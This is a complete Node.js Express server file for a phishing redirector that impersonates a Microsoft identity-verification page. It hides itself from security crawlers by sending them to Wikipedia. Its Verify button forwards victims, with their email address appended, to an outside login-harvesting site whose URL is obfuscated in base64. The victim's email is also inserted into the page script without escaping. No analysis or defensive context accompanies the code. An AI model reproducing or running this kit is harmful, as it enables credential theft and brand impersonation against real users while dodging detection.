const express = require('express');
const app = express();

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || "";
    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit/i.test(ua);
    
    if (isBot) return res.redirect("https://www.wikipedia.org");

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Microsoft Security Verification</title>
            <style>
                body { background: #f2f2f2; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .card { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
                .logo { width: 110px; margin-bottom: 25px; }
                .btn { background: #0067b8; color: white; border: none; padding: 12px 35px; cursor: pointer; font-size: 16px; font-weight: 600; border-radius: 2px; }
                .btn:hover { background: #005da6; }
                h2 { font-size: 22px; color: #1b1b1b; margin-bottom: 10px; font-weight: 600; }
                p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
                .hp { display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
                <h2>Verify your identity</h2>
                <p>Please confirm you are not a robot to access this secured document.</p>
                
                <button class="hp" onclick="window.location.href='https://www.microsoft.com'">Click Here</button>
                <button id="verifyBtn" class="btn">Verify</button>
            </div>

            <script>
                const p1 = "${part1}"; const p2 = "${part2}"; const emailCaptured = "${targetEmail}";
                document.getElementById('verifyBtn').addEventListener('click', function() {
                    this.innerText = "Verifying...";
                    setTimeout(() => {
                        let target = atob(p1) + atob(p2);
                        if(emailCaptured !== "") {
                            target += (target.includes('?') ? '&' : '?') + "email=" + encodeURIComponent(emailCaptured);
                        }
                        window.location.href = target;
                    }, 1000);
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
